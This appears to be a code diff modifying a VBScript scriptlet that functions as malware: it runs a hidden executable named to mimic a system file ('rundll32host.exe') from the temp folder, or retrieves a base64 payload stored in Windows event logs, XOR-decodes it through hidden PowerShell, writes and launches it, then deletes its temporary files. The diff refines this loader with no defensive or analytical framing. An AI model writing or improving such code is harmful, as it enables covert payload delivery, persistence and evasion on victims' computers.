@@ -2,23 +2,22 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim objShell
+Dim objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
-Dim objFSO
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 Dim tempDir
 tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
-Dim lockFile
-lockFile = tempDir & "\persist_running.tmp"
 Dim peFile
 peFile = tempDir & "\rundll32host.exe"
+Dim lockFile
+lockFile = tempDir & "\persist_running.tmp"
+Dim b64File
+b64File = tempDir & "\persist_b64.tmp"
 
 If objFSO.FileExists(peFile) Then
-    Dim fCheck
-    Set fCheck = objFSO.GetFile(peFile)
-    If fCheck.Size > 0 Then
-        objShell.Run peFile, 0, False
+    If objFSO.GetFile(peFile).Size > 0 Then
+        objShell.Run """" & peFile & """", 0, False
         WScript.Quit
     End If
 End If
@@ -37,8 +36,7 @@ End If
 
 Dim colEvents
 Set colEvents = objWMIService.ExecQuery( _
-    "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Microsoft-Windows-Wininit' AND EventCode = 19 " & _
-    "ORDER BY TimeGenerated DESC")
+    "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Microsoft-Windows-Wininit' AND EventCode = 19")
 If Err.Number <> 0 Then
     objFSO.DeleteFile lockFile, True
     WScript.Quit
@@ -66,13 +64,19 @@ If Len(eventMessage) = 0 Then
     WScript.Quit
 End If
 
-objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
-    "$b=[Convert]::FromBase64String('" & eventMessage & "');" & _
-    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" & _
-    "$p=$env:TEMP+'\rundll32host.exe';" & _
-    "[IO.File]::WriteAllBytes($p,$b);" & _
-    "Start-Process $p -WindowStyle Hidden""", 0, True
+Dim b64Stream
+Set b64Stream = objFSO.CreateTextFile(b64File, True)
+b64Stream.Write eventMessage
+b64Stream.Close
 
+objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
+    "$b64=[IO.File]::ReadAllText('" & b64File & "');" & _
+    "$b=[Convert]::FromBase64String($b64);" & _
+    "$k=0x77;for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor $k;$k=($k+5)-band 0xFF};" & _
+    "[IO.File]::WriteAllBytes('" & peFile & "',$b);" & _
+    "Start-Process '" & peFile & "' -WindowStyle Hidden""", 0, True
+
+objFSO.DeleteFile b64File, True
 objFSO.DeleteFile lockFile, True
 </script>
 </scriptlet>
